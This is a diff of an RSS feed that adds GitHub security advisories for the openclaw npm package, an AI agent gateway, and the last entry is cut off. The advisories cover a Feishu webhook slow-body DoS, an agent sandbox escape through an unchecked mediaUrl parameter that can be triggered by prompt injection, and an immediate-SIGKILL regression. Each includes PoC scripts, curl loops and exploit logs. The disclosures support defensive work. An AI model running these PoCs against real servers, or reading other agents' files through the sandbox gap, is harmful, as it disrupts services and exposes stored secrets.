@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-03-30T17:32:20.641Z</updated>
+    <updated>2026-03-30T18:33:19.408Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,699 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[openclaw] OpenClaw has incomplete Fix for CVE-2026-32011: Feishu Webhook Pre-Auth Body Parsing DoS (Slow-Body / Slowloris Variant)]]></title>
+        <id>https://github.com/advisories/GHSA-w6m8-cqvj-pg5v</id>
+        <link href="https://github.com/advisories/GHSA-w6m8-cqvj-pg5v"/>
+        <updated>2026-03-30T18:32:04.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>Fixed in OpenClaw 2026.3.24, the current shipping release.</p>
+</blockquote>
+<h1 id="advisory-details">Advisory Details</h1>
+<p><strong>Title</strong>: Incomplete Fix for CVE-2026-32011: Feishu Webhook Pre-Auth Body Parsing DoS (Slow-Body / Slowloris Variant)</p>
+<p><strong>Description</strong>:</p>
+<h3 id="summary">Summary</h3>
+<p>The patch for CVE-2026-32011 tightened pre-auth body parsing limits (from 1MB/30s to 64KB/5s) across several webhook handlers. However, the <strong>Feishu extension's webhook handler</strong> was not included in the patch and still accepts request bodies with the old permissive limits (1MB body, 30-second timeout) <strong>before</strong> verifying the webhook signature. An unauthenticated attacker can exhaust server connection resources by sending concurrent slow HTTP POST requests to the Feishu webhook endpoint.</p>
+<h3 id="details">Details</h3>
+<p>In <code>extensions/feishu/src/monitor.ts</code>, the webhook HTTP handler uses <code>installRequestBodyLimitGuard</code> with permissive limits at lines 276-278:</p>
+<pre><code class="language-typescript">const FEISHU_WEBHOOK_MAX_BODY_BYTES = 1024 * 1024;    // 1MB (line 26)
+const FEISHU_WEBHOOK_BODY_TIMEOUT_MS = 30_000;         // 30s (line 27)
+
+// ... in monitorWebhook(), line 276-278:
+const guard = installRequestBodyLimitGuard(req, res, {
+  maxBytes: FEISHU_WEBHOOK_MAX_BODY_BYTES,    // 1MB
+  timeoutMs: FEISHU_WEBHOOK_BODY_TIMEOUT_MS,  // 30s
+  responseFormat: "text",
+});
+</code></pre>
+<p>The body guard is installed at line 276 <strong>before</strong> the request reaches the Lark SDK's <code>adaptDefault</code> webhook handler (line 284), which performs signature verification. This means:</p>
+<ol>
+<li>Any unauthenticated HTTP POST is accepted</li>
+<li>The server waits up to 30 seconds for the body to arrive</li>
+<li>Each connection can buffer up to 1MB</li>
+<li>Authentication only happens after the body is fully read</li>
+</ol>
+<p>The patched handlers (Mattermost, MSTeams, Google Chat, etc.) now use tight pre-auth limits:</p>
+<pre><code class="language-typescript">const PREAUTH_MAX_BODY_BYTES = 64 * 1024;     // 64KB
+const PREAUTH_BODY_TIMEOUT_MS = 5_000;         // 5s
+</code></pre>
+<p>The Feishu extension was missed because it resides in <code>extensions/feishu/</code> (a plugin workspace) rather than in the core <code>src/</code> directory.</p>
+<p><strong>Attack chain:</strong></p>
+<pre><code>[Attacker sends slow HTTP POST to /feishu/events]
+  → Rate limit check: passes (under 120 req/min)
+  → Content-Type check: application/json, passes
+  → installRequestBodyLimitGuard(1MB, 30s): installed
+  → Body trickles at 1 byte/sec for 30 seconds
+  → × 50 concurrent connections = connection exhaustion
+  → Legitimate Feishu webhook deliveries blocked
+</code></pre>
+<h3 id="poc">PoC</h3>
+<p><strong>Prerequisites:</strong> Docker installed.</p>
+<p><strong>Step 1:</strong> Create a minimal test server reproducing the vulnerable body parsing:</p>
+<pre><code class="language-bash">cat &gt; /tmp/feishu_webhook_server.js &lt;&lt; 'EOF'
+const http = require("http");
+const VULN_TIMEOUT = 30_000;   // Vulnerable: 30s (same as Feishu handler)
+const PATCH_TIMEOUT = 5_000;   // Patched: 5s (what it should be)
+
+function bodyGuard(req, res, timeoutMs) {
+  let done = false;
+  const timer = setTimeout(() =&gt; {
+    if (!done) { done = true; res.statusCode = 408; res.end("Request body timeout"); req.destroy(); }
+  }, timeoutMs);
+  req.on("end", () =&gt; { done = true; clearTimeout(timer); });
+  req.on("close", () =&gt; { done = true; clearTimeout(timer); });
+}
+
+http.createServer((req, res) =&gt; {
+  if (req.url === "/healthz") { res.end("OK"); return; }
+  if (req.method !== "POST") { res.writeHead(405); res.end(); return; }
+  const timeout = req.url === "/feishu/events" ? VULN_TIMEOUT : PATCH_TIMEOUT;
+  console.log(`[${req.url}] +conn`);
+  bodyGuard(req, res, timeout);
+  res.on("finish", () =&gt; console.log(`[${req.url}] -conn`));
+}).listen(3000, () =&gt; console.log("Listening on :3000"));
+EOF
+node /tmp/feishu_webhook_server.js &amp;
+sleep 1
+</code></pre>
+<p><strong>Step 2:</strong> Verify the vulnerability — slow body holds connection for the full timeout:</p>
+<pre><code class="language-bash"># Vulnerable endpoint: connection stays open for ~10 seconds (max 30s)
+time (echo -n '{"t":"'; sleep 10; echo '"}') | \
+  curl -s -o /dev/null -w "status: %{http_code}\n" \
+  -X POST http://localhost:3000/feishu/events \
+  -H "Content-Type: application/json" \
+  -H "Content-Length: 65536" \
+  --data-binary @- --max-time 35
+
+# Patched endpoint: connection terminated after ~5s
+time (echo -n '{"t":"'; sleep 10; echo '"}') | \
+  curl -s -o /dev/null -w "status: %{http_code}\n" \
+  -X POST http://localhost:3000/patched/events \
+  -H "Content-Type: application/json" \
+  -H "Content-Length: 65536" \
+  --data-binary @- --max-time 35
+</code></pre>
+<p><strong>Step 3:</strong> Batch exploit — 10 concurrent slow connections:</p>
+<pre><code class="language-bash">for i in $(seq 1 10); do
+  (echo -n 'A'; sleep 15) | \
+    curl -s -o /dev/null -X POST http://localhost:3000/feishu/events \
+    -H "Content-Type: application/json" \
+    -H "Content-Length: 65536" \
+    --data-binary @- --max-time 35 &amp;
+done
+wait
+</code></pre>
+<h3 id="log-of-evidence">Log of Evidence</h3>
+<p><strong>Exploit result (vulnerable /feishu/events):</strong></p>
+<pre><code>=== Feishu Webhook Pre-Auth Slow-Body DoS ===
+Target: localhost:3000/feishu/events
+Concurrent connections: 10
+
+  [conn-0] held open for 15.0s (15B sent) [SUCCESS]
+  [conn-1] held open for 15.0s (15B sent) [SUCCESS]
+  [conn-2] held open for 15.0s (15B sent) [SUCCESS]
+  [conn-3] held open for 15.0s (15B sent) [SUCCESS]
+  [conn-4] held open for 15.0s (15B sent) [SUCCESS]
+  [conn-5] held open for 15.0s (15B sent) [SUCCESS]
+  [conn-6] held open for 15.0s (15B sent) [SUCCESS]
+  [conn-7] held open for 15.0s (15B sent) [SUCCESS]
+  [conn-8] held open for 15.0s (15B sent) [SUCCESS]
+  [conn-9] held open for 15.0s (15B sent) [SUCCESS]
+
+=== Results ===
+Connections held open (SUCCESS): 10/10
+[SUCCESS] Pre-auth slow-body DoS confirmed!
+</code></pre>
+<p><strong>Control result (patched /patched/events with 5s timeout):</strong></p>
+<pre><code>=== CONTROL: Patched Webhook Body Limits (64KB/5s) ===
+Target: localhost:3000/patched/events
+
+  [conn-0] RESET after 8.0s (8B)
+  [conn-1] RESET after 8.0s (8B)
+  ...
+  [conn-9] RESET after 8.0s (8B)
+
+Avg connection hold time: 8.0s (5s timeout + stagger delay)
+</code></pre>
+<p><strong>Server-side Docker logs confirming the discrepancy:</strong></p>
+<pre><code>[feishu-vulnerable] +conn (active: 1)
+[feishu-vulnerable] +conn (active: 10)  ← No disconnections during 15s attack
+[patched-control] +conn (active: 20)
+[patched-control] -conn after 5.0s (active: 19)  ← ALL terminated at 5s
+[patched-control] -conn after 5.0s (active: 10)
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>An unauthenticated attacker can cause a <strong>Denial of Service</strong> against any OpenClaw instance running the Feishu channel in webhook mode. The Feishu webhook endpoint must be publicly accessible for Feishu to deliver webhooks, so the attacker can directly target it.</p>
+<p>With ~50 concurrent slow HTTP connections (each trickling 1 byte/second), the attacker can:</p>
+<ul>
+<li>Exhaust the server's connection handling capacity for 30 seconds per wave</li>
+<li>Block legitimate Feishu webhook deliveries (messages not reaching the bot)</li>
+<li>Consume up to 50MB of memory (50 × 1MB buffer) per attack wave</li>
+</ul>
+<p>The attack is trivial — it only requires sending slow HTTP POST requests. No valid Feishu webhook signature or any other credentials are needed.</p>
+<h3 id="affected-products">Affected products</h3>
+<ul>
+<li><strong>Ecosystem</strong>: npm</li>
+<li><strong>Package name</strong>: openclaw</li>
+<li><strong>Affected versions</strong>: &lt;= 2026.2.22</li>
+<li><strong>Patched versions</strong>: None</li>
+</ul>
+<h3 id="severity">Severity</h3>
+<ul>
+<li><strong>Severity</strong>: Medium</li>
+<li><strong>Vector string</strong>: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</li>
+</ul>
+<h3 id="weaknesses">Weaknesses</h3>
+<ul>
+<li><strong>CWE</strong>: CWE-400: Uncontrolled Resource Consumption</li>
+</ul>
+<h3 id="occurrences">Occurrences</h3>
+<table>
+<thead>
+<tr>
+<th align="left">Permalink</th>
+<th align="left">Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><a href="https://github.com/openclaw/openclaw/blob/main/extensions/feishu/src/monitor.ts#L26-L27">https://github.com/openclaw/openclaw/blob/main/extensions/feishu/src/monitor.ts#L26-L27</a></td>
+<td align="left">Permissive body limit constants: <code>FEISHU_WEBHOOK_MAX_BODY_BYTES = 1024 * 1024</code> (1MB) and <code>FEISHU_WEBHOOK_BODY_TIMEOUT_MS = 30_000</code> (30s) — should be 64KB/5s to match the CVE-2026-32011 patch.</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/openclaw/openclaw/blob/main/extensions/feishu/src/monitor.ts#L276-L280">https://github.com/openclaw/openclaw/blob/main/extensions/feishu/src/monitor.ts#L276-L280</a></td>
+<td align="left"><code>installRequestBodyLimitGuard</code> call in <code>monitorWebhook()</code> using the permissive constants — this guard runs before authentication (the Lark SDK handler at line 284).</td>
+</tr>
+</tbody></table>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-w6m8-cqvj-pg5v">https://github.com/openclaw/openclaw/security/advisories/GHSA-w6m8-cqvj-pg5v</a></li>
+<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-x4vp-4235-65hg">https://github.com/openclaw/openclaw/security/advisories/GHSA-x4vp-4235-65hg</a></li>
+<li><a href="https://github.com/advisories/GHSA-w6m8-cqvj-pg5v">https://github.com/advisories/GHSA-w6m8-cqvj-pg5v</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w6m8-cqvj-pg5v</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-30T18:32:03.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[openclaw] OpenClaw has Sandbox Media Root Bypass via Unnormalized `mediaUrl` / `fileUrl` Parameter Keys (CWE-22)]]></title>
+        <id>https://github.com/advisories/GHSA-hr5v-j9h9-xjhg</id>
+        <link href="https://github.com/advisories/GHSA-hr5v-j9h9-xjhg"/>
+        <updated>2026-03-30T18:31:02.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>Fixed in OpenClaw 2026.3.24, the current shipping release.</p>
+</blockquote>
+<h3 id="advisory-details">Advisory Details</h3>
+<p><strong>Title</strong>: Sandbox Media Root Bypass via Unnormalized <code>mediaUrl</code> / <code>fileUrl</code> Parameter Keys (CWE-22)</p>
+<p><strong>Description</strong>:</p>
+<h3 id="summary">Summary</h3>
+<p>A path traversal vulnerability in the agent sandbox enforcement allows a sandboxed agent to read arbitrary files from other agents' workspaces by using the <code>mediaUrl</code> or <code>fileUrl</code> parameter key in message tool calls. The <code>normalizeSandboxMediaParams</code> function only checks <code>["media", "path", "filePath"]</code> keys, while <code>mediaUrl</code> and <code>fileUrl</code> escape normalization entirely. Combined with <code>handlePluginAction</code> dropping <code>mediaLocalRoots</code> from the dispatch context, this enables a full sandbox escape where any agent can read files outside its designated sandbox root.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerability exists in two files within the messaging pipeline:</p>
+<p><strong>1. Incomplete parameter key coverage in <code>normalizeSandboxMediaParams</code>:</strong></p>
+<p>In <code>src/infra/outbound/message-action-params.ts</code>, the function iterates over a hardcoded allowlist of parameter keys to validate:</p>
+<pre><code class="language-typescript">// Line 212
+const mediaKeys: Array&lt;"media" | "path" | "filePath"&gt; = ["media", "path", "filePath"];
+</code></pre>
+<p>The <code>mediaUrl</code> and <code>fileUrl</code> parameter keys are not included in this array. These keys are actively used by multiple channel extensions (Discord, Telegram, Slack, Matrix, Twitch) for media attachment handling, but they completely bypass the sandbox path validation performed by <code>resolveSandboxedMediaSource</code>.</p>
+<p><strong>2. Dropped <code>mediaLocalRoots</code> in <code>handlePluginAction</code>:</strong></p>
+<p>In <code>src/infra/outbound/message-action-runner.ts</code>, the <code>handlePluginAction</code> function dispatches actions to channel plugins but omits <code>mediaLocalRoots</code> from the context:</p>
+<pre><code class="language-typescript">// Lines 684-697
+const handled = await dispatchChannelMessageAction({
+    channel,
+    action,
+    cfg,
+    params,
+    accountId: accountId ?? undefined,
+    requesterSenderId: input.requesterSenderId ?? undefined,
+    sessionKey: input.sessionKey,
+    sessionId: input.sessionId,
+    agentId,
+    gateway,
+    toolContext: input.toolContext,
+    dryRun,
+    // mediaLocalRoots is MISSING here
+});
+</code></pre>
+<p>Despite <code>ChannelMessageActionContext</code> defining <code>mediaLocalRoots?: readonly string[]</code> (in <code>src/channels/plugins/types.core.ts</code> line 478), plugins receive <code>undefined</code> and fall back to <code>getDefaultMediaLocalRoots()</code>, which permits reads of the entire <code>~/.openclaw/</code> directory tree — including all agents' workspaces.</p>
+<p><strong>Attack chain:</strong></p>
+<ol>
+<li>A sandboxed agent (Agent-A at <code>~/.openclaw/workspace/agent-a/</code>) calls the message tool with <code>{ mediaUrl: "~/.openclaw/workspace/agent-b/secret.txt" }</code></li>
+<li><code>normalizeSandboxMediaParams</code> skips the <code>mediaUrl</code> key (not in allowlist)</li>
+<li><code>handlePluginAction</code> dispatches without <code>mediaLocalRoots</code></li>
+<li>Plugin calls <code>loadWebMedia</code> with default roots, which allows <code>~/.openclaw/workspace/**</code></li>
+<li>Agent-B's secret file content is read and sent as a channel attachment</li>
+</ol>
+<h3 id="poc">PoC</h3>
+<p><strong>Prerequisites:</strong></p>
+<ul>
+<li>Docker installed</li>
+<li>OpenClaw Docker image built (<code>openclaw-gateway:latest</code>)</li>
+</ul>
+<p><strong>Steps:</strong></p>
+<ol>
+<li>Start the vulnerable gateway container:</li>
+</ol>
+<pre><code class="language-bash">cd llm-enhance/cve-finding/Path_Traversal/CVE-2026-27522-Media_Root_Bypass-variant-exp/
+docker compose up -d
+sleep 5
+</code></pre>
+<ol start="2">
+<li>Run the exploit:</li>
+</ol>
+<pre><code class="language-bash">python3 poc_exploit.py
+</code></pre>
+<ol start="3">
+<li><p>The exploit writes a secret file to <code>~/.openclaw/workspace/agent-b/secret_key.txt</code> inside the container, then invokes <code>normalizeSandboxMediaParams</code> with Agent-A's sandbox policy and <code>{ mediaUrl: &lt;agent-b-secret-path&gt; }</code>. The <code>mediaUrl</code> key bypasses normalization, and <code>loadWebMedia</code> reads the file successfully.</p>
+</li>
+<li><p>Run the control experiment to confirm sandbox works for checked keys:</p>
+</li>
+</ol>
+<pre><code class="language-bash">python3 control-sandbox_enforced.py
+</code></pre>
+<h3 id="log-of-evidence">Log of Evidence</h3>
+<p><strong>Exploit output:</strong></p>
+<pre><code>=== CVE-2026-27522 Variant: Sandbox Media Root Bypass ===
+
+[*] Container 'openclaw-media-bypass-test' is running
+[*] Running exploit script with Bun...
+
+[VULNERABLE] mediaUrl bypassed normalizeSandboxMediaParams!
+  Agent-A sandboxRoot: /root/.openclaw/workspace/agent-a
+  mediaUrl targets Agent-B: /root/.openclaw/workspace/agent-b/secret_key.txt
+  args after normalization: {"mediaUrl":"/root/.openclaw/workspace/agent-b/secret_key.txt"}
+[EXPLOITED] Agent-B secret file content: AGENT-B-SECRET-API-KEY-sk-12345abcdef
+
+=== EXPLOIT SUCCESSFUL ===
+Agent-A read Agent-B's secret file via mediaUrl, bypassing sandbox.
+
+[+] RESULT: VULNERABLE — mediaUrl bypasses sandbox enforcement
+</code></pre>
+<p><strong>Control experiment output:</strong></p>
+<pre><code>=== Control Experiment: Sandbox Enforcement for 'media' Key ===
+
+[*] Container 'openclaw-media-bypass-test' is running
+[*] Running control script with Bun...
+
+[SAFE] normalizeSandboxMediaParams blocked 'media' key as expected!
+  Error: Path escapes sandbox root (/tmp/sandbox-ZKvGQX): /tmp/victim-2cuAOO/secret.txt
+
+=== CONTROL EXPERIMENT PASSED ===
+The 'media' parameter IS correctly checked by sandbox enforcement.
+Only unchecked keys (mediaUrl, fileUrl) bypass the sandbox.
+
+[+] CONTROL PASSED: 'media' key is correctly enforced by sandbox
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This is a <strong>sandbox escape</strong> vulnerability. An attacker who can influence an agent's tool calls (via prompt injection, multi-agent interaction, or malicious plugin instruction) can read arbitrary files from other agents' workspaces. This includes:</p>
+<ul>
+<li>API keys and secrets stored in other agents' sandboxes</li>
+<li>Session data and conversation logs</li>
+<li>Configuration files with sensitive credentials</li>
+<li>Any file within the <code>~/.openclaw/</code> directory tree</li>
+</ul>
+<p>This completely defeats the purpose of the multi-agent sandbox isolation feature, which is documented as a security boundary in the project's Docker and sandboxing documentation.</p>
+<h3 id="affected-products">Affected products</h3>
+<ul>
+<li><strong>Ecosystem</strong>: npm</li>
+<li><strong>Package name</strong>: openclaw</li>
+<li><strong>Affected versions</strong>: &lt;= 2026.3.14 (current latest)</li>
+<li><strong>Patched versions</strong>: </li>
+</ul>
+<h3 id="severity">Severity</h3>
+<ul>
+<li><strong>Severity</strong>: High</li>
+<li><strong>Vector string</strong>: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N</li>
+</ul>
+<h3 id="weaknesses">Weaknesses</h3>
+<ul>
+<li><strong>CWE</strong>: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</li>
+</ul>
+<h3 id="occurrences">Occurrences</h3>
+<table>
+<thead>
+<tr>
+<th align="left">Permalink</th>
+<th align="left">Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><a href="https://github.com/moltbot/moltbot/blob/main/src/infra/outbound/message-action-params.ts#L206-L227">https://github.com/moltbot/moltbot/blob/main/src/infra/outbound/message-action-params.ts#L206-L227</a></td>
+<td align="left">The <code>normalizeSandboxMediaParams</code> function with incomplete <code>mediaKeys</code> allowlist — <code>mediaUrl</code> and <code>fileUrl</code> are not checked.</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/moltbot/moltbot/blob/main/src/infra/outbound/message-action-runner.ts#L684-L697">https://github.com/moltbot/moltbot/blob/main/src/infra/outbound/message-action-runner.ts#L684-L697</a></td>
+<td align="left">The <code>handlePluginAction</code> dispatch call that omits <code>mediaLocalRoots</code> from the context passed to <code>dispatchChannelMessageAction</code>.</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/moltbot/moltbot/blob/main/src/channels/plugins/types.core.ts#L478">https://github.com/moltbot/moltbot/blob/main/src/channels/plugins/types.core.ts#L478</a></td>
+<td align="left">The <code>ChannelMessageActionContext</code> type that defines <code>mediaLocalRoots</code> but never receives it from <code>handlePluginAction</code>.</td>
+</tr>
+</tbody></table>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-hr5v-j9h9-xjhg">https://github.com/openclaw/openclaw/security/advisories/GHSA-hr5v-j9h9-xjhg</a></li>
+<li><a href="https://github.com/advisories/GHSA-hr5v-j9h9-xjhg">https://github.com/advisories/GHSA-hr5v-j9h9-xjhg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hr5v-j9h9-xjhg</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-30T18:31:02.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[openclaw] OpenClaw has incomplete Fix for CVE-2026-27486: Unvalidated SIGKILL in `!stop` Chat Command via `shell-utils.ts`]]></title>
+        <id>https://github.com/advisories/GHSA-3298-56p6-rpw2</id>
+        <link href="https://github.com/advisories/GHSA-3298-56p6-rpw2"/>
+        <updated>2026-03-30T18:30:02.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>Fixed in OpenClaw 2026.3.24, the current shipping release.</p>
+</blockquote>
+<h3 id="advisory-details">Advisory Details</h3>
+<p><strong>Title</strong>: Incomplete Fix for CVE-2026-27486: Unvalidated SIGKILL in <code>!stop</code> Chat Command via <code>shell-utils.ts</code></p>
+<p><strong>Description</strong>:</p>
+<h3 id="summary">Summary</h3>
+<p>The <code>!stop</code> (and <code>/bash stop</code>) chat command kills background bash processes using <code>SIGKILL</code> directly, without first sending <code>SIGTERM</code> to allow graceful shutdown. This is because <code>bash-command.ts</code> imports <code>killProcessTree()</code> from <code>src/agents/shell-utils.ts</code>, which still contains the pre-CVE-2026-27486 aggressive kill logic, rather than from the patched <code>src/process/kill-tree.ts</code>.</p>
+<h3 id="details">Details</h3>
+<p>CVE-2026-27486 fixed unsafe process termination by introducing a graceful shutdown sequence in <code>src/process/kill-tree.ts</code> — sending <code>SIGTERM</code> first, waiting a configurable grace period (default 3 seconds), then escalating to <code>SIGKILL</code> only if the process is still alive.</p>
+<p>However, an identical copy of the <strong>unpatched</strong> <code>killProcessTree</code> function remains in <code>src/agents/shell-utils.ts</code> (lines 170–192). This function sends <code>SIGKILL</code> immediately with no <code>SIGTERM</code>:</p>
+<pre><code class="language-typescript">// src/agents/shell-utils.ts:170-192
+export function killProcessTree(pid: number): void {
+  // ... Windows handling ...
+  try {
+    process.kill(-pid, "SIGKILL"); // Immediate hard kill, no SIGTERM
+  } catch {
+    try {
+      process.kill(pid, "SIGKILL");
+    } catch {
+      // process already dead
+    }
+  }
+}
+</code></pre>
+<p>The <code>!stop</code> chat command handler in <code>src/auto-reply/reply/bash-command.ts</code> imports and calls this vulnerable version at line 302:</p>
+<pre><code class="language-typescript">// src/auto-reply/reply/bash-command.ts:5
+import { killProcessTree } from "../../agents/shell-utils.js";
+
+// src/auto-reply/reply/bash-command.ts:300-304
+const pid = running.pid ?? running.child?.pid;
+if (pid) {
+  killProcessTree(pid);  // Calls the UNPATCHED version
+}
+markExited(running, null, "SIGKILL", "failed");
+</code></pre>
+<p>Compare this to the patched version in <code>src/process/kill-tree.ts</code>:</p>
+<pre><code class="language-typescript">// src/process/kill-tree.ts:46-78
+function killProcessTreeUnix(pid: number, graceMs: number): void {
+  // Step 1: Try graceful SIGTERM to process group
+  try {
+    process.kill(-pid, "SIGTERM");
+  } catch { /* ... */ }
+
+  // Step 2: Wait grace period, then SIGKILL if still alive
+  setTimeout(() =&gt; {
+    if (isProcessAlive(-pid)) {
+      try { process.kill(-pid, "SIGKILL"); } catch { /* ... */ }
+    }
+  }, graceMs).unref();
+}
+</code></pre>
+<h3 id="poc">PoC</h3>
+<p>This PoC demonstrates the difference between the vulnerable and patched code paths inside a running OpenClaw Gateway container.</p>
+<p><strong>Setup:</strong></p>
+<pre><code class="language-bash"># Build and start the gateway container
+cd CVE-2026-27486-variant-exp/
+docker compose up -d
+sleep 5
+</code></pre>
+<p><strong>Exploit (vulnerable <code>killProcessTree</code> from <code>shell-utils.ts</code>):</strong></p>
+<p>The following script is injected into the container and executed. It starts a bash process that traps <code>SIGTERM</code> for graceful shutdown, then kills it using the same code path as <code>!stop</code>:</p>
+<pre><code class="language-javascript">// exploit_sigkill.cjs — replicates src/agents/shell-utils.ts:183-190
+const { spawn } = require('child_process');
+const fs = require('fs');
+
+try { fs.unlinkSync('/tmp/graceful_shutdown.txt'); } catch {}
+
+const child = spawn('/bin/bash', ['-c',
+  'trap \'echo GRACEFUL_SHUTDOWN &gt; /tmp/graceful_shutdown.txt; exit 0\' SIGTERM; while true; do sleep 1; done'
+], { detached: true, stdio: 'ignore' });
+child.unref();
+
+setTimeout(() =&gt; {
+  // VULNERABLE: same as shell-utils.ts — SIGKILL only
+  try { process.kill(-child.pid, 'SIGKILL'); } catch {
+    try { process.kill(child.pid, 'SIGKILL'); } catch {}
+  }
+  setTimeout(() =&gt; {
+    if (fs.existsSync('/tmp/graceful_shutdown.txt')) {
+      console.log('[BLOCKED] SIGTERM was received.');
+      process.exit(1);
+    } else {
+      console.log('[EXPLOITED] SIGKILL sent directly — SIGTERM never delivered.');
+      process.exit(0);
+    }
+  }, 2000);
+}, 1000);
+</code></pre>
+<p><strong>Run:</strong></p>
+<pre><code class="language-bash">python3 poc_exploit.py
+</code></pre>
+<h3 id="log-of-evidence">Log of Evidence</h3>
+<p><strong>Exploit output (SIGKILL only, no graceful shutdown):</strong></p>
+<pre><code>[*] Running exploit (vulnerable killProcessTree from shell-utils.ts)...
+[*] Victim PID: 78
+[*] Calling vulnerable killProcessTree (SIGKILL only, no SIGTERM)...
+[EXPLOITED] SIGKILL sent directly — SIGTERM never delivered.
+[EXPLOITED] Graceful shutdown handler was NEVER invoked.
+
+[SUCCESS] CVE-2026-27486 variant confirmed:
+  killProcessTree() in shell-utils.ts sends immediate SIGKILL,
+  bypassing the graceful shutdown fix in process/kill-tree.ts.
+</code></pre>
+<p><strong>Control output (SIGTERM first, graceful shutdown works):</strong></p>
+<pre><code>[*] Running control (patched killProcessTree from process/kill-tree.ts)...
+[*] Victim PID: 93
+[*] Calling patched killProcessTree (SIGTERM first, then SIGKILL after grace)...
+[NORMAL] SIGTERM received — graceful shutdown completed. Flag: GRACEFUL_SHUTDOWN
+
+[NORMAL] Control confirmed: patched killProcessTree sends SIGTERM first,
+         allowing graceful shutdown before escalating to SIGKILL.
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>When <code>!stop</code> is used, background processes are killed instantly via <code>SIGKILL</code> with no chance to perform cleanup. This can result in:</p>
+<ul>
+<li><strong>Data corruption</strong>: processes writing to files or databases are interrupted mid-write</li>
+<li><strong>Resource leaks</strong>: temporary files, lock files, and network connections are not properly released</li>
+<li><strong>Security-sensitive cleanup skipped</strong>: operations like erasing in-memory secrets or completing audit logs are bypassed</li>
+</ul>
+<p>This is the same class of impact that CVE-2026-27486 was filed for — the fix simply missed the <code>shell-utils.ts</code> copy of the function.</p>
+<h3 id="affected-products">Affected products</h3>
+<ul>
+<li><strong>Ecosystem</strong>: npm</li>
+<li><strong>Package name</strong>: openclaw</li>
+<li><strong>Affected versions</strong>: &lt;= 2026.3.14</li>
+<li><strong>Patched versions</strong>: </li>
+</ul>
+<h3 id="severity">Severity</h3>
+<ul>
+<li><strong>Severity</strong>: Medium</li>
+<li><strong>Vector string</strong>: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H</li>
+</ul>
+<h3 id="weaknesses">Weaknesses</h3>
+<ul>
+<li><strong>CWE</strong>: CWE-404: Improper Resource Shutdown or Release</li>
+</ul>
+<h3 id="occurrences">Occurrences</h3>
+<table>
+<thead>
+<tr>
+<th align="left">Permalink</th>
+<th align="left">Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><a href="https://github.com/moltbot/moltbot/blob/f2849c2417/src/agents/shell-utils.ts#L170-L192">https://github.com/moltbot/moltbot/blob/f2849c2417/src/agents/shell-utils.ts#L170-L192</a></td>
+<td align="left">The vulnerable <code>killProcessTree</code> function that sends immediate <code>SIGKILL</code> without <code>SIGTERM</code>.</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/moltbot/moltbot/blob/f2849c2417/src/auto-reply/reply/bash-command.ts#L5">https://github.com/moltbot/moltbot/blob/f2849c2417/src/auto-reply/reply/bash-command.ts#L5</a></td>
+<td align="left">Import statement pulling the vulnerable <code>killProcessTree</code> from <code>shell-utils.ts</code> instead of the patched <code>kill-tree.ts</code>.</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/moltbot/moltbot/blob/f2849c2417/src/auto-reply/reply/bash-command.ts#L300-L304">https://github.com/moltbot/moltbot/blob/f2849c2417/src/auto-reply/reply/bash-command.ts#L300-L304</a></td>
+<td align="left">The <code>!stop</code> handler calling the vulnerable <code>killProcessTree(pid)</code>.</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/moltbot/moltbot/blob/f2849c2417/src/process/kill-tree.ts#L46-L78">https://github.com/moltbot/moltbot/blob/f2849c2417/src/process/kill-tree.ts#L46-L78</a></td>
+<td align="left">The <strong>patched</strong> <code>killProcessTreeUnix</code> with graceful <code>SIGTERM</code> → grace period → <code>SIGKILL</code> sequence (for reference).</td>
+</tr>
+</tbody></table>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-3298-56p6-rpw2">https://github.com/openclaw/openclaw/security/advisories/GHSA-3298-56p6-rpw2</a></li>
+<li><a href="https://github.com/advisories/GHSA-jfv4-h8mc-jcp8">https://github.com/advisories/GHSA-jfv4-h8mc-jcp8</a></li>
